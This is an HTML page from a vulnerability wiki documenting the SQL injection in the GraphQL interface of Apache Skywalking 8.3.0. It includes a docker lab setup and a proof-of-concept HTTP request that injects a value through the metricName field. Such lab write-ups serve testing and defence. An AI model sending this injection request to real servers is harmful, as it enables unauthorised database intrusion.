@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/skywalking/8.3.0-sqli/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Apache Skywalking 8.3.0 SQL Injection Vulnerability - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Apache Skywalking 8.3.0 SQL Injection Vulnerability", url: "#_top", children: [
+              {title: "Vulnerability environment", url: "#vulnerability-environment" },
+              {title: "POC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Apache Skywalking 8.3.0 SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../showdoc/CNVD-2020-26585/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../showdoc/CNVD-2020-26585/README.zh-cn/" class="btn btn-xs btn-link">
+        ShowDoc 前台任意文件上传（CNVD-2020-26585）
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="apache-skywalking-830-sql-injection-vulnerability">Apache Skywalking 8.3.0 SQL Injection Vulnerability<a class="headerlink" href="#apache-skywalking-830-sql-injection-vulnerability" title="Permanent link">&para;</a></h1>
+<p><a href="README.zh-cn/">中文版本(Chinese version)</a></p>
+<p>Application performance monitor tool for distributed systems, especially designed for microservices, cloud native and container-based (Docker, Kubernetes, Mesos) architectures.</p>
+<p>In GraphQL interfaces of Apache Skywalking 8.3.0 and previous, there is a H2 Database SQL injection vulnerability.</p>
+<p>Reference link:</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw">https://mp.weixin.qq.com/s/hB-r523_4cM0jZMBOt6Vhw</a></li>
+<li><a href="https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c">https://github.com/apache/skywalking/commit/0bd81495965d801315dd7417bb17333ae0eccf3b#diff-ec87a1cdf66cdb37574d9eafd4d72d99ed94a38c4a8ff2aa9c7b8daeff502a2c</a></li>
+</ul>
+<h2 id="vulnerability-environment">Vulnerability environment<a class="headerlink" href="#vulnerability-environment" title="Permanent link">&para;</a></h2>
+<p>Execute the following command to start an Apache Skywalking 8.3.0:</p>
+<div class="highlight"><pre><span></span><code>docker compose up -d
+</code></pre></div>
+<p>After the environment is started, visit <code>http://your-ip:8080</code> to view the Skywalking page.</p>
+<h2 id="poc">POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p>I use GraphiQL's desktop app to send the following GraphQL query:</p>
+<p><img alt="" src="1.png" /></p>
+<p>It can be seen that the SQL statement has raised error, and the value of the <code>metricName</code> parameter has been injected ​​after <code>from</code>.</p>
+<p>The HTTP request of this GraphQL query is:</p>
+<div class="highlight"><pre><span></span><code>POST /graphql HTTP/1.1
+Host: localhost:8080
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+Connection: close
+Content-Type: application/json
+Content-Length: 336
+
+{
+    &quot;query&quot;:&quot;query queryLogs($condition: LogQueryCondition) {
+  queryLogs(condition: $condition) {
+    total
+    logs {
+      serviceId
+      serviceName
+      isError
+      content
+    }
+  }
+}
+&quot;,
+    &quot;variables&quot;:{
+        &quot;condition&quot;:{
+            &quot;metricName&quot;:&quot;sqli&quot;,
+            &quot;state&quot;:&quot;ALL&quot;,
+            &quot;paging&quot;:{
+                &quot;pageSize&quot;:10
+            }
+        }
+    }
+}
+</code></pre></div>
+<p>For more in-depth exploit, you can research by yourself, and welcome to submit PR to us.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="README.zh-cn/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="README.zh-cn/" class="btn btn-xs btn-link">
+        Apache Skywalking 8.3.0 SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../showdoc/CNVD-2020-26585/README.zh-cn/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../showdoc/CNVD-2020-26585/README.zh-cn/" class="btn btn-xs btn-link">
+        ShowDoc 前台任意文件上传（CNVD-2020-26585）
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
